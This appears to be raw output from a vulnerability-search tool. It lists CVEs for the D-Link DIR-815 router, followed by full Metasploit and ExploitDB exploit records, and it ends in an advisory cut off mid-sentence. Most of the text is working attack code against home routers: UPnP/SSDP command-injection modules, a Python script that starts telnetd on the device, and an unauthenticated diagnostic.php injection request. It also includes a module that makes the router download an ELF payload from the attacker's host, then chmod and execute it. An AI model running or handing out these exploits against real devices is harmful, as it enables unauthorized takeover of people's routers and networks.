检索到漏洞和exp的总条数:17
{'source': 'CVE', '_id': '2018-10108', 'description': 'D-Link DIR-815 REV. B (with firmware through DIR-815_REVB_FIRMWARE_PATCH_2.07.B01) devices have XSS in the Treturn parameter to /htdocs/webinc/js/bsc_sms_inbox.php.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2018-10108'], 'msb': []}
{'source': 'CVE', '_id': '2015-0150', 'description': 'The remote administration UI in D-Link DIR-815 devices with firmware before 2.07.B01 allows remote attackers to bypass intended access restrictions via unspecified vectors.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2015-0150'], 'msb': []}
{'source': 'CVE', '_id': '2018-10107', 'description': 'D-Link DIR-815 REV. B (with firmware through DIR-815_REVB_FIRMWARE_PATCH_2.07.B01) devices have XSS in the RESULT parameter to /htdocs/webinc/js/info.php.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2018-10107'], 'msb': []}
{'source': 'CVE', '_id': '2015-0152', 'description': 'D-Link DIR-815 devices with firmware before 2.07.B01 allow remote attackers to obtain sensitive information by leveraging cleartext storage of the administrative password.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2015-0152'], 'msb': []}
{'source': 'CVE', '_id': '2015-0153', 'description': 'D-Link DIR-815 devices with firmware before 2.07.B01 allow remote attackers to obtain sensitive information by leveraging cleartext storage of the wireless key.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2015-0153'], 'msb': []}
{'source': 'CVE', '_id': '2015-0151', 'description': 'Cross-site request forgery (CSRF) vulnerability in D-Link DIR-815 devices with firmware before 2.07.B01 allows remote attackers to hijack the authentication of arbitrary users for requests that insert XSS sequences.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2015-0151'], 'msb': []}
{'source': 'CVE', '_id': '2018-10106', 'description': 'D-Link DIR-815 REV. B (with firmware through DIR-815_REVB_FIRMWARE_PATCH_2.07.B01) devices have permission bypass and information disclosure in /htdocs/web/getcfg.php, as demonstrated by a /getcfg.php?a=%0a_POST_SERVICES%3DDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3D1 request.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2018-10106'], 'msb': []}
{'source': 'CVE', '_id': '2014-8888', 'description': 'The remote administration interface in D-Link DIR-815 devices with firmware before 2.03.B02 allows remote attackers to execute arbitrary commands via vectors related to an "HTTP command injection issue."', 'osvdb': [], 'bid': [], 'cve': ['CVE-2014-8888'], 'msb': []}
{'code': '##\n# This module requires Metasploit: http://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire \'msf/core\'\n\nclass Metasploit3 < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      \'Name\'        => \'D-Link Unauthenticated UPnP M-SEARCH Multicast Command Injection\',\n      \'Description\' => %q{\n        Different D-Link Routers are vulnerable to OS command injection via UPnP Multicast\n        requests. This module has been tested on DIR-300 and DIR-645 devices. Zachary Cutlip\n        has initially reported the DIR-815 vulnerable. Probably there are other devices also\n        affected.\n      },\n      \'Author\'      =>\n        [\n          \'Zachary Cutlip\', # Vulnerability discovery and initial exploit\n          \'Michael Messner <devnull[at]s3cur1ty.de>\' # Metasploit module and verification on other routers\n        ],\n      \'License\'     => MSF_LICENSE,\n      \'References\'  =>\n        [\n          [\'URL\', \'https://github.com/zcutlip/exploit-poc/tree/master/dlink/dir-815-a1/upnp-command-injection\'], # original exploit\n          [\'URL\', \'http://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html\'] # original exploit\n        ],\n      \'DisclosureDate\' => \'Feb 01 2013\',\n      \'Privileged\'     => true,\n      \'Targets\' =>\n        [\n          [ \'MIPS Little Endian\',\n            {\n              \'Platform\' => \'linux\',\n              \'Arch\'     => ARCH_MIPSLE\n            }\n          ],\n          [ \'MIPS Big Endian\', # unknown if there are big endian devices out there\n            {\n              \'Platform\' => \'linux\',\n              \'Arch\'     => ARCH_MIPS\n            }\n          ]\n        ],\n      \'DefaultTarget\'  => 0\n      ))\n\n    register_options(\n      [\n        Opt::RHOST(),\n        Opt::RPORT(1900)\n      ], self.class)\n\n    deregister_options(\'CMDSTAGER::DECODER\', \'CMDSTAGER::FLAVOR\')\n  end\n\n  def check\n    configure_socket\n\n    pkt =\n      "M-SEARCH * HTTP/1.1\\r\\n" +\n      "Host:239.255.255.250:1900\\r\\n" +\n      "ST:upnp:rootdevice\\r\\n" +\n      "Man:\\"ssdp:discover\\"\\r\\n" +\n      "MX:2\\r\\n\\r\\n"\n\n    udp_sock.sendto(pkt, rhost, rport, 0)\n\n    res = nil\n    1.upto(5) do\n      res,_,_ = udp_sock.recvfrom(65535, 1.0)\n      break if res and res =~ /SERVER:\\ Linux,\\ UPnP\\/1\\.0,\\ DIR-...\\ Ver/mi\n      udp_sock.sendto(pkt, rhost, rport, 0)\n    end\n\n    # UPnP response:\n    # [*] 192.168.0.2:1900 SSDP Linux, UPnP/1.0, DIR-645 Ver 1.03 | http://192.168.0.2:49152/InternetGatewayDevice.xml | uuid:D02411C0-B070-6009-39C5-9094E4B34FD1::urn:schemas-upnp-org:device:InternetGatewayDevice:1\n    # we do not check for the Device ID (DIR-645) and for the firmware version because there are different\n    # dlink devices out there and we do not know all the vulnerable versions\n\n    if res && res =~ /SERVER:\\ Linux,\\ UPnP\\/1.0,\\ DIR-...\\ Ver/mi\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def execute_command(cmd, opts)\n    configure_socket\n\n    pkt =\n      "M-SEARCH * HTTP/1.1\\r\\n" +\n      "Host:239.255.255.250:1900\\r\\n" +\n      "ST:uuid:`#{cmd}`\\r\\n" +\n      "Man:\\"ssdp:discover\\"\\r\\n" +\n      "MX:2\\r\\n\\r\\n"\n\n    udp_sock.sendto(pkt, rhost, rport, 0)\n  end\n\n  def exploit\n    print_status("#{peer} - Trying to access the device via UPnP ...")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable device")\n    end\n\n    print_status("#{peer} - Exploiting...")\n    execute_cmdstager(\n      :flavor  => :echo,\n      :linemax => 950\n    )\n  end\n\n  # the packet stuff was taken from the module miniupnpd_soap_bof.rb\n  # We need an unconnected socket because SSDP replies often come\n  # from a different sent port than the one we sent to. This also\n  # breaks the standard UDP mixin.\n  def configure_socket\n    self.udp_sock = Rex::Socket::Udp.create({\n      \'Context\'   => { \'Msf\' => framework, \'MsfExploit\' => self }\n    })\n    add_socket(self.udp_sock)\n  end\n\n  # Need to define our own rhost/rport/peer since we aren\'t\n  # using the normal mixins\n\n  def rhost\n    datastore[\'RHOST\']\n  end\n\n  def rport\n    datastore[\'RPORT\']\n  end\n\n  def peer\n    "#{rhost}:#{rport}"\n  end\n\n  # Accessor for our UDP socket\n  attr_accessor :udp_sock\n\nend\n', 'description': 'Different D-Link Routers are vulnerable to OS command injection via UPnP Multicast\n        requests. This module has been tested on DIR-300 and DIR-645 devices. Zachary Cutlip\n        has initially reported the DIR-815 vulnerable. Probably there are other devices also\n        affected.', 'bid': [], 'rank': 'excellent', 'alias': None, 'arch': '[]', '_id': 'exploit/linux/upnp/dlink_upnp_msearch_exec', 'osvdb': [], 'author': ['Zachary Cutlip', 'Michael Messner <devnull@s3cur1ty.de>'], 'msb': [], 'platform': [], 'version': '0', 'source': 'Metasploit', 'title': 'D-Link Unauthenticated UPnP M-SEARCH Multicast Command Injection', 'cve': [], 'type': 'exploit', 'privileged': True}
{'code': '## Advisory Information\r\n\r\nTitle: SSDP command injection using UDP for a lot of Dlink routers including DIR-815, DIR-850L\r\nVendors contacted: William Brown <william.brown@dlink.com> (Dlink)\r\nRelease mode: Released\r\nCVE: None\r\n\r\nNote: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, \r\nhttp://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061\r\n\r\nHowever, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares. The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes.\r\n\r\n## Product Description\r\n\r\nMany Dlink routers affected. Tested on DIR-815.\r\n\r\n## Vulnerabilities Summary\r\n\r\nDIR-815,850L and most of Dlink routers are susceptible to this flaw. This allows to perform command injection using SSDP packets and on UDP. So no authentication required. Just the fact that the attacker needs to be on wireless LAN or be able to fake a request coming from internal wireless LAN using some other mechanism.\r\n\r\n## Details\r\n\r\n# Command injection\r\n----------------------------------------------------------------------------------------------------------------------\r\nimport socket\r\nimport struct\r\n\r\n# This vulnerability is pretty much in every router that has cgibin and uses SSDP code in that cgibin. This one worked on the device dir-815. Will work only in WLAN\r\n\r\n\r\nbuf = \'M-SEARCH * HTTP/1.1\\r\\nHOST:239.255.255.250:1900\\r\\nST:urn:schemas-upnp-org:service:WANIPConnection:1;telnetd -p 9094;ls\\r\\nMX:2\\r\\nMAN:"ssdp:discover"\\r\\n\\r\\n\'\r\n\r\nprint "[+] sending buffer size", len(buf)\r\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\r\ns.connect(("239.255.255.250", 1900))\r\ns.send(buf)\r\ns.close()\r\n\r\n\r\n----------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n## Report Timeline\r\n\r\n* Jan 22, 2015: Vulnerability found by Samuel Huntley by William Brown.\r\n* Feb 15, 2015: Vulnerability is patched by Dlink\r\n* Nov 13, 2015: A public advisory is sent to security mailing lists.\r\n\r\n## Credit\r\n\r\nThis vulnerability was found by Samuel Huntley', 'description': 'D-Link DIR-815 / DIR-850L - SSDP Command Injection', 'author': 'Samuel Huntley', '_id': 38715, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2015-11-16T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 1900}
{'code': "# Exploit Title: Multiple Vulnerabilities in Dlink devices\r\n# Date: 05.04.2013\r\n# Exploit Author: m-1-k-3\r\n# Vendor Homepage: http://www.dlink.de\r\n# Software Link: http://www.dlink.de/cs/Satellite?c=Product_C&childpagename=DLinkEurope-DE%2FDLProductCarouselSingle&cid=1197391383981&p=1197318958269&packedargs=ProductParentID%3D1197318677527%26category%3DQuickProductFinder%26locale%3D1195806663795%26term%3DDIR-645&pagename=DLinkEurope-DE%2FDLWrapper\r\n# Version: different devices and versions are affected\r\n\r\nDevice Name: DIR-600 / DIR-300 revB / DIR-815 / DIR-645 / DIR-412 / DIR-456 / DIR-110\r\nVendor: D-Link\r\n\r\n============  Vulnerable Firmware Releases: ============ \r\n\r\nDIR-815 v1.03b02 (unauthenticated command injection)\r\nDIR-645 v1.02 (unauthenticated command injection)\r\nDIR-645 v1.03 (authenticated command injection)\r\nDIR-600 below v2.16b01 (with v2.16b01 D-Link also fixes different vulnerabilities reported in M1ADV2013-003)\r\nDIR-300 revB v2.13b01 (unauthenticated command injection)\r\nDIR-300 revB v2.14b01 (authenticated command injection)\r\nDIR-412 Ver 1.14WWB02 (unauthenticated command injection)\r\nDIR-456U Ver 1.00ONG (unauthenticated command injection)\r\nDIR-110 Ver 1.01 (unauthenticated command injection)\r\n\r\nPossible other versions and devices are also affected by this vulnerability.\r\n\r\n============ Shodan Torks ============ \r\n\r\nShodan search: Server: Linux, HTTP/1.1, DIR\r\n\t=> 9300 results\r\n\t\r\n============ Vulnerability Overview: ============ \r\n\r\n* OS Command Injection\r\n\r\nThe vulnerability is caused by missing input validation in the dst parameter and missing session validation and can be exploited to inject and execute arbitrary shell commands.\r\n\r\nWARNING: You do not need to be authenticated to the device to insert and execute malicious commands.\r\nHint: On different devices like the DIR-645 wget is preinstalled and you are able to upload and execute your malicious code.\r\n\r\n\t=> Parameter: dst\r\n\r\nExample Exploit:\r\nPOST /diagnostic.php HTTP/1.1\r\nHost: xxxx\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nProxy-Connection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nReferer: http://xxxx/\r\nContent-Length: 41\r\nCookie: uid=hfaiGzkB4z\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\nact=ping&dst=%26%20COMMAND%26\r\n\r\nScreenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/05.04.2013%20-%20Dlink-DIR-645_msf-shell.txt.png\r\n\r\n* Information disclosure:\r\n\r\nNice server banner to detect this type of devices easily:\r\n\r\nServer Banner: Server: Linux, HTTP/1.1, DIR-815\r\nServer Banner: Server: Linux, HTTP/1.1, DIR-645\r\nServer Banner: Server: Linux, HTTP/1.1, DIR-600\r\nServer Banner: Server: Linux, HTTP/1.1, DIR-300\r\nServer Banner: Server: Linux, HTTP/1.1, DIR-412\r\nServer Banner: Server: Linux, HTTP/1.1, DIR-456U\r\nServer Banner: Server: Linux, HTTP/1.1, DIR-110\r\n\r\n* Information Disclosure:\r\n\r\nDetailed device information including Model Name, Hardware Version, Linux Kernel, Firmware version, Language and MAC Addresses are available via the network.\r\n\r\nRequest:\r\nhttp://<IP>IP/DevInfo.txt or http://<IP>IP/version.txt (check the source of the site)\r\n\r\nResponse to DevInfo.txt:\r\n\r\nFirmware External Version: V1.00\r\nFirmware Internal Version: a86b\r\nModel Name: DIR-815\r\nHardware Version: \r\nWLAN Domain: xxx\r\nKernel: 2.6.33.2\r\nLanguage: en\r\nGraphcal Authentication: Disable\r\nLAN MAC: xx\r\nWAN MAC: xx\r\nWLAN MAC: xx\r\n\r\nThese details are available without authentication.\r\n\r\n============ Solution ============\r\n\r\nDIR-645: Update to firmware v1.04b5\r\nDIR-600: Update to firmware v2.16B01\r\nDIR-300rev B: Update to firmware 2.14B01 fixes the authentication bypass but not the command injection vulnerability.\r\nOther devices: No known solution available.\r\n\r\n============ Credits ============\r\n\r\nThe vulnerability was discovered by Michael Messner\r\nMail: devnull#at#s3cur1ty#dot#de\r\nWeb: http://www.s3cur1ty.de/advisories\r\nTwitter: @s3cur1ty_de\r\n\r\n============ Time Line: ============\r\n\r\n14.12.2012 - discovered vulnerability in first device\r\n14.12.2012 - contacted dlink via the webinterface http://www.dlink.com/us/en/home-solutions/contact-d-link\r\n20.12.2012 - contacted Heise Security with details and Heisec forwarded the details to D-Link\r\n21.12.2012 - D-link responded that they will check the findings\r\n11.01.2013 - requested status update\r\n25.01.2013 - requested status update and updated D-Link with the other vulnerable devices\r\n25.01.2013 - D-Link responded that this is a security problem from the user and/or browser and they will not provide a fix.\r\n07.02.2013 - after the DIR-600/300 drama D'Link contacted me and now they are talking with me ;)\r\nsince 07.02.2013 - Good communication and firmware testing\r\n27.02.2013 - Roberto Paleari releases details about authentication bypass in DIR-645 - http://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt\r\n05.04.2013 - vendor releases firmware updates\r\n05.04.2013 - public release\r\n\r\n===================== Advisory end =====================", 'description': 'D-Link - Multiple Vulnerabilities', 'author': 'm-1-k-3', '_id': 24926, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2013-04-08T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 0}
{'code': '##\n# This module requires Metasploit: http://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire \'msf/core\'\n\nclass Metasploit3 < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      \'Name\'        => \'D-Link DIR-645 / DIR-815 diagnostic.php Command Execution\',\n      \'Description\' => %q{\n          Some D-Link Routers are vulnerable to OS Command injection in the web interface.\n        On DIR-645 versions prior 1.03 authentication isn\'t needed to exploit it. On\n        version 1.03 authentication is needed in order to trigger the vulnerability, which\n        has been fixed definitely on version 1.04. Other D-Link products, like DIR-300 rev B\n        and DIR-600, are also affected by this vulnerability. Not every device includes\n        wget which we need for deploying our payload. On such devices you could use the cmd\n        generic payload and try to start telnetd or execute other commands. Since it is a\n        blind OS command injection vulnerability, there is no output for the executed\n        command when using the cmd generic payload. A ping command against a controlled\n        system could be used for testing purposes. This module has been tested successfully\n        on DIR-645 prior to 1.03, where authentication isn\'t needed in order to exploit the\n        vulnerability.\n      },\n      \'Author\'      =>\n        [\n          \'Michael Messner <devnull[at]s3cur1ty.de>\', # Vulnerability discovery and Metasploit module\n          \'juan vazquez\' # minor help with msf module\n        ],\n      \'License\'     => MSF_LICENSE,\n      \'References\'  =>\n        [\n          [ \'OSVDB\', \'92144\' ],\n          [ \'BID\', \'58938\' ],\n          [ \'EDB\', \'24926\' ],\n          [ \'URL\', \'http://www.s3cur1ty.de/m1adv2013-017\' ]\n        ],\n      \'DisclosureDate\' => \'Mar 05 2013\',\n      \'Privileged\'     => true,\n      \'Platform\'       => %w{ linux unix },\n      \'Payload\'        =>\n        {\n          \'DisableNops\' => true\n        },\n      \'Targets\'        =>\n        [\n          [ \'CMD\',\n            {\n            \'Arch\' => ARCH_CMD,\n            \'Platform\' => \'unix\'\n            }\n          ],\n          [ \'Linux mipsel Payload\',\n            {\n            \'Arch\' => ARCH_MIPSLE,\n            \'Platform\' => \'linux\'\n            }\n          ],\n        ],\n      \'DefaultTarget\'  => 1\n      ))\n\n    register_options(\n      [\n        OptAddress.new(\'DOWNHOST\', [ false, \'An alternative host to request the MIPS payload from\' ]),\n        OptString.new(\'DOWNFILE\', [ false, \'Filename to download, (default: random)\' ]),\n        OptInt.new(\'HTTP_DELAY\', [true, \'Time that the HTTP Server will wait for the ELF payload request\', 60])\n      ], self.class)\n  end\n\n\n  def request(cmd,uri)\n    begin\n      res = send_request_cgi({\n        \'uri\'    => uri,\n        \'method\' => \'POST\',\n        \'vars_post\' => {\n          "act" => "ping",\n          "dst" => "` #{cmd}`"\n        }\n      })\n    return res\n    rescue ::Rex::ConnectionError\n      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")\n      return nil\n    end\n  end\n\n  def exploit\n    downfile = datastore[\'DOWNFILE\'] || rand_text_alpha(8+rand(8))\n    uri = \'/diagnostic.php\'\n\n    if target.name =~ /CMD/\n      if not (datastore[\'CMD\'])\n        fail_with(Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")\n      end\n      cmd = payload.encoded\n      res = request(cmd,uri)\n      if (!res)\n        fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")\n      end\n      print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")\n      return\n    end\n\n    #thx to Juan for his awesome work on the mipsel elf support\n    @pl = generate_payload_exe\n    @elf_sent = false\n\n    #\n    # start our server\n    #\n    resource_uri = \'/\' + downfile\n\n    if (datastore[\'DOWNHOST\'])\n      service_url = \'http://\' + datastore[\'DOWNHOST\'] + \':\' + datastore[\'SRVPORT\'].to_s + resource_uri\n    else\n      #do not use SSL\n      if datastore[\'SSL\']\n        ssl_restore = true\n        datastore[\'SSL\'] = false\n      end\n\n      #we use SRVHOST as download IP for the coming wget command.\n      #SRVHOST needs a real IP address of our download host\n      if (datastore[\'SRVHOST\'] == "0.0.0.0" or datastore[\'SRVHOST\'] == "::")\n        srv_host = Rex::Socket.source_address(rhost)\n      else\n        srv_host = datastore[\'SRVHOST\']\n      end\n\n      service_url = \'http://\' + srv_host + \':\' + datastore[\'SRVPORT\'].to_s + resource_uri\n\n      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")\n      start_service({\'Uri\' => {\n        \'Proc\' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n        \'Path\' => resource_uri\n      }})\n\n      datastore[\'SSL\'] = true if ssl_restore\n    end\n\n    #\n    # download payload\n    #\n    print_status("#{rhost}:#{rport} - Asking the D-Link device to download #{service_url}")\n    #this filename is used to store the payload on the device\n    filename = rand_text_alpha_lower(8)\n\n    #not working if we send all command together -> lets take three requests\n    cmd = "/usr/bin/wget #{service_url} -O /tmp/#{filename}"\n    res = request(cmd,uri)\n    if (!res)\n      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")\n    end\n\n    # wait for payload download\n    if (datastore[\'DOWNHOST\'])\n      print_status("#{rhost}:#{rport} - Giving #{datastore[\'HTTP_DELAY\']} seconds to the D-Link device to download the payload")\n      select(nil, nil, nil, datastore[\'HTTP_DELAY\'])\n    else\n      wait_linux_payload\n    end\n    register_file_for_cleanup("/tmp/#{filename}")\n\n    #\n    # chmod\n    #\n    cmd = "chmod 777 /tmp/#{filename}"\n    print_status("#{rhost}:#{rport} - Asking the D-Link device to chmod #{downfile}")\n    res = request(cmd,uri)\n    if (!res)\n      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")\n    end\n\n    #\n    # execute\n    #\n    cmd = "/tmp/#{filename}"\n    print_status("#{rhost}:#{rport} - Asking the D-Link device to execute #{downfile}")\n    res = request(cmd,uri)\n    if (!res)\n      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")\n    end\n\n  end\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    #print_status("on_request_uri called: #{request.inspect}")\n    if (not @pl)\n      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn\'t ready yet!")\n      return\n    end\n    print_status("#{rhost}:#{rport} - Sending the payload to the server...")\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  # wait for the data to be sent\n  def wait_linux_payload\n    print_status("#{rhost}:#{rport} - Waiting for the target to request the ELF payload...")\n\n    waited = 0\n    while (not @elf_sent)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore[\'HTTP_DELAY\'])\n        fail_with(Failure::Unknown, "#{rhost}:#{rport} - Target didn\'t request request the ELF payload -- Maybe it can\'t connect back to us?")\n      end\n    end\n  end\n\nend\n', 'description': "Some D-Link Routers are vulnerable to OS Command injection in the web interface.\n        On DIR-645 versions prior 1.03 authentication isn't needed to exploit it. On\n        version 1.03 authentication is needed in order to trigger the vulnerability, which\n        has been fixed definitely on version 1.04. Other D-Link products, like DIR-300 rev B\n        and DIR-600, are also affected by this vulnerability. Not every device includes\n        wget which we need for deploying our payload. On such devices you could use the cmd\n        generic payload and try to start telnetd or execute other commands. Since it is a\n        blind OS command injection vulnerability, there is no output for the executed\n        command when using the cmd generic payload. A ping command against a controlled\n        system could be used for testing purposes. This module has been tested successfully\n        on DIR-645 prior to 1.03, where authentication isn't needed in order to exploit the\n        vulnerability.", 'bid': ['58938'], 'rank': 'excellent', 'alias': None, 'arch': '[]', '_id': 'exploit/linux/http/dlink_diagnostic_exec_noauth', 'osvdb': ['92144'], 'author': ['Michael Messner <devnull@s3cur1ty.de>', 'juan vazquez <juan.vazquez@metasploit.com>'], 'msb': [], 'platform': ['Linux', 'Unix'], 'version': '0', 'source': 'Metasploit', 'title': 'D-Link DIR-645 / DIR-815 diagnostic.php Command Execution', 'cve': [], 'type': 'exploit', 'privileged': True}
{'code': '##\r\n# This module requires Metasploit: http//metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire \'msf/core\'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  include Msf::Exploit::CmdStager\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      \'Name\'        => \'D-Link Unauthenticated UPnP M-SEARCH Multicast Command Injection\',\r\n      \'Description\' => %q{\r\n        Different D-Link Routers are vulnerable to OS command injection via UPnP Multicast\r\n        requests. This module has been tested on DIR-300 and DIR-645 devices. Zachary Cutlip\r\n        has initially reported the DIR-815 vulnerable. Probably there are other devices also\r\n        affected.\r\n      },\r\n      \'Author\'      =>\r\n        [\r\n          \'Zachary Cutlip\', # Vulnerability discovery and initial exploit\r\n          \'Michael Messner <devnull[at]s3cur1ty.de>\' # Metasploit module and verification on other routers\r\n        ],\r\n      \'License\'     => MSF_LICENSE,\r\n      \'References\'  =>\r\n        [\r\n          [\'URL\', \'https://github.com/zcutlip/exploit-poc/tree/master/dlink/dir-815-a1/upnp-command-injection\'], # original exploit\r\n          [\'URL\', \'http://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html\'] # original exploit\r\n        ],\r\n      \'DisclosureDate\' => \'Feb 01 2013\',\r\n      \'Privileged\'     => true,\r\n      \'Targets\' =>\r\n        [\r\n          [ \'MIPS Little Endian\',\r\n            {\r\n              \'Platform\' => \'linux\',\r\n              \'Arch\'     => ARCH_MIPSLE\r\n            }\r\n          ],\r\n          [ \'MIPS Big Endian\', # unknown if there are big endian devices out there\r\n            {\r\n              \'Platform\' => \'linux\',\r\n              \'Arch\'     => ARCH_MIPS\r\n            }\r\n          ]\r\n        ],\r\n      \'DefaultTarget\'  => 0\r\n      ))\r\n\r\n    register_options(\r\n      [\r\n        Opt::RHOST(),\r\n        Opt::RPORT(1900)\r\n      ], self.class)\r\n\r\n    deregister_options(\'CMDSTAGER::DECODER\', \'CMDSTAGER::FLAVOR\')\r\n  end\r\n\r\n  def check\r\n    configure_socket\r\n\r\n    pkt =\r\n      "M-SEARCH * HTTP/1.1\\r\\n" +\r\n      "Host:239.255.255.250:1900\\r\\n" +\r\n      "ST:upnp:rootdevice\\r\\n" +\r\n      "Man:\\"ssdp:discover\\"\\r\\n" +\r\n      "MX:2\\r\\n\\r\\n"\r\n\r\n    udp_sock.sendto(pkt, rhost, rport, 0)\r\n\r\n    res = nil\r\n    1.upto(5) do\r\n      res,_,_ = udp_sock.recvfrom(65535, 1.0)\r\n      break if res and res =~ /SERVER:\\ Linux,\\ UPnP\\/1\\.0,\\ DIR-...\\ Ver/mi\r\n      udp_sock.sendto(pkt, rhost, rport, 0)\r\n    end\r\n\r\n    # UPnP response:\r\n    # [*] 192.168.0.2:1900 SSDP Linux, UPnP/1.0, DIR-645 Ver 1.03 | http://192.168.0.2:49152/InternetGatewayDevice.xml | uuid:D02411C0-B070-6009-39C5-9094E4B34FD1::urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n    # we do not check for the Device ID (DIR-645) and for the firmware version because there are different\r\n    # dlink devices out there and we do not know all the vulnerable versions\r\n\r\n    if res && res =~ /SERVER:\\ Linux,\\ UPnP\\/1.0,\\ DIR-...\\ Ver/mi\r\n      return Exploit::CheckCode::Detected\r\n    end\r\n\r\n    Exploit::CheckCode::Unknown\r\n  end\r\n\r\n  def execute_command(cmd, opts)\r\n    configure_socket\r\n\r\n    pkt =\r\n      "M-SEARCH * HTTP/1.1\\r\\n" +\r\n      "Host:239.255.255.250:1900\\r\\n" +\r\n      "ST:uuid:`#{cmd}`\\r\\n" +\r\n      "Man:\\"ssdp:discover\\"\\r\\n" +\r\n      "MX:2\\r\\n\\r\\n"\r\n\r\n    udp_sock.sendto(pkt, rhost, rport, 0)\r\n  end\r\n\r\n  def exploit\r\n    print_status("#{rhost}:#{rport} - Trying to access the device via UPnP ...")\r\n\r\n    unless check == Exploit::CheckCode::Detected\r\n      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Failed to access the vulnerable device")\r\n    end\r\n\r\n    print_status("#{rhost}:#{rport} - Exploiting...")\r\n    execute_cmdstager(\r\n      :flavor  => :echo,\r\n      :linemax => 950\r\n    )\r\n  end\r\n\r\n  # the packet stuff was taken from the module miniupnpd_soap_bof.rb\r\n  # We need an unconnected socket because SSDP replies often come\r\n  # from a different sent port than the one we sent to. This also\r\n  # breaks the standard UDP mixin.\r\n  def configure_socket\r\n    self.udp_sock = Rex::Socket::Udp.create({\r\n      \'Context\'   => { \'Msf\' => framework, \'MsfExploit\' => self }\r\n    })\r\n    add_socket(self.udp_sock)\r\n  end\r\n\r\n  #\r\n  # Required since we aren\'t using the normal mixins\r\n  #\r\n\r\n  def rhost\r\n    datastore[\'RHOST\']\r\n  end\r\n\r\n  def rport\r\n    datastore[\'RPORT\']\r\n  end\r\n\r\n  # Accessor for our UDP socket\r\n  attr_accessor :udp_sock\r\n\r\nend', 'description': 'D-Link Devices - UPnP M-SEARCH Multicast Command Injection (Metasploit)', 'author': 'Metasploit', '_id': 34065, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2014-07-14T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 1900}
{'code': '## Advisory Information\r\n\r\nTitle: DIR-815 Buffer overflows and Command injection in authentication and HNAP functionalities\r\nVendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink)\r\nCVE: None\r\n\r\nNote: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, \r\nhttp://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061\r\n\r\nHowever, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares. The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes.\r\n\r\n## Product Description\r\n\r\nDIR-815 -- Wireless N300 Dual Band Router. Mainly used by home and small offices.\r\n\r\n## Vulnerabilities Summary\r\n\r\nHave come across 3 security issues in DIR-815 firmware which allows an attacker to exploit command injection and buffer overflows in authentication adn HNAP functionality. All of them can be exploited by an unauthentictaed attacker. The attacker can be on wireless LAN or WAN if mgmt interface is exposed to attack directly or using 